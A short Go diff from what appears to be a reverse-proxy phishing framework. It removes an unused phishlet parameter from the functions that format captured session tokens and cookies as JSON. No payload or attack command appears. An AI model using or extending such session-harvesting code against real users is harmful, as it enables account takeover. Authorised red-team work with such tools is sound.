@@ -399,7 +399,7 @@ func (t *Terminal) handleSessions(args []string) error {
 		s_found := false
 		for _, s := range sessions {
 			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
+				_, err := t.cfg.GetPhishlet(s.Phishlet)
 				if err != nil {
 					log.Error("%v", err)
 					break
@@ -446,7 +446,7 @@ func (t *Terminal) handleSessions(args []string) error {
 						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
 					}
 					if len(s.CookieTokens) > 0 {
-						json_tokens := t.cookieTokensToJSON(pl, s.CookieTokens)
+						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
 						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
 					}
 				}
@@ -1215,7 +1215,7 @@ func (t *Terminal) createHelp() {
 	t.hlp = h
 }
 
-func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
+func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
 	type Cookie struct {
 		Path           string `json:"path"`
 		Domain         string `json:"domain"`
@@ -1259,7 +1259,7 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 	return string(json)
 }
 
-func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]string) string {
+func (t *Terminal) tokensToJSON(tokens map[string]string) string {
 	var ret string
 	white := color.New(color.FgHiWhite)
 	for k, v := range tokens {
